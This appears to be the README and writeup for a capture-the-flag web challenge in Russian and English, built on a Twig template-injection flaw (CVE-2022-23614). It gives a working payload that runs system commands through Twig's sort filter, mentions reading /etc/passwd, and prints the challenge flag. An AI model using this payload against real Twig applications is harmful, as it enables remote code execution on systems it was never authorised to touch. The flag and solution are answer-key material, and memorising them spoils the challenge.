# Secure templates
 Web task for [M*CTF](https://mctf.mtuci.ru) Finals 

**Описание задания:**

Мне нравится обработчик флаблонов Twig. Возможно он не самый безопасный 

https://ip:1337

**English**

I prefer Twig template engine. Maybe it's not secure enough

https://ip:1337

## Build 
```bash
cd mctf-final-secure-templates
./build.sh
```
## Start
In Browser: localhost:1337

## Writeup 

После поиска уязвимостей обработчика шаблонов twig, можно наткнуться на [эту](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23614). После этого найти PoC репозиторий на [Github](https://github.com/davwwwx/CVE-2022-23614), который ~~украден~~ взят за основу этого задания. В поле задания можно выполнить производный код, введя следующее выражение:
```bash
{{ ['id','']|sort('system') }}
```
Где id - станадрная Unix команда для вывода имени пользователя и его группы. Удаленный код выполнится и будет выведено:

![image](https://user-images.githubusercontent.com/77790965/189837506-f1373715-5d34-4dec-b8fd-0efe6bc074fc.png)


Удаленный код выполнен, а значит можно попробовать что-то ещё, например почитать системные файлы. Флаг будет находиться в файле /etc/passwd.

![image](https://user-images.githubusercontent.com/77790965/189839569-d74df404-42ea-4877-9b15-3b99211151da.png)

## Flag
```
mctf{tW1g_C0dE_Ex3c}
```
